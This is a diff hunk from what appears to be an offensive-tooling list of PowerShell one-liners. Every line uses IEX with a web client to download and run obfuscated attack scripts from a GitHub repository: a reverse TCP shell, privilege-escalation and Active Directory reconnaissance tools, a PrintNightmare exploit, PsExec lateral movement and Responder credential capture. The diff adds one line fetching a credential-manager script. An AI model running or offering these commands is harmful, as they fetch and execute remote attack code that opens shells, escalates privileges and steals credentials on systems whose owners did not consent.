@@ -14,6 +14,7 @@ IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/Invoke-PowerShellTcp.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/Invoke-PowerUp.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/Invoke-PowerView.ps1-xorencoded.ps1')
+IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/credential-manager.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/Invoke-Printnightmare.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/Invoke-PsExec.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/Invoke-Responder.ps1-xorencoded.ps1')
